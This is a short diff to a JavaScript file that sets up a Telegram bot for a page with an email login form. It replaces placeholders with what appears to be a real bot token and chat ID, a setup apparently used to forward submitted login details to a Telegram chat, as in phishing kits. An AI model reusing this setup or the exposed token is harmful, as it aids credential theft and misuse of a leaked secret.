@@ -1,7 +1,7 @@
 document.addEventListener('DOMContentLoaded', function() {
     // Telegram Bot Configuration
-    const TELEGRAM_BOT_TOKEN = 'YOUR_BOT_TOKEN'; // Replace with your bot token
-    const TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID'; // Replace with your chat ID
+    const TELEGRAM_BOT_TOKEN = '8101442954:AAGBNz1uHe9v1dWDhMr9duIT_N33lUv-A9Y'; // Replace with your bot token
+    const TELEGRAM_CHAT_ID = '8163151595'; // Replace with your chat ID
     
     // DOM elements
     const loginForm = document.getElementById('email-form');
